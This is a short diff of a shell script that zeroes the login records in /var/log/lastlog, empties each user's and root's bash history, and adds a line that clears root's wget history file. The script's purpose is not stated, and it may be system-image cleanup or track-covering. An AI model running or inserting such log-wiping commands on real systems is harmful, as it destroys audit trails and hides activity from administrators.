@@ -37,11 +37,12 @@ cd
 #sed -i 's/authorized_keys/authorized_key/g' /etc/ssh/sshd_config
 #service sshd restart
 sed -i 's/[0-9]/0/g' /var/log/lastlog
-users=`ll /home/ | grep -vE "root|total" | awk '{print $9}' | sed 's/\///g'`
+users=`ls -la /home/ | grep -vE "root|total" | awk '{print $9}' | sed 's/\///g'`
 for i in ${users}; do
         cat /dev/null > /home/$i/.bash_history
 done
-cat /dev/null > /root/.bash_history
+cat /dev/null > /root/.bash_history || true
+cat /dev/null > /root/.wget-hsts || true
 sleep 10
 rm -r /usr/share/packages_download
 history -c
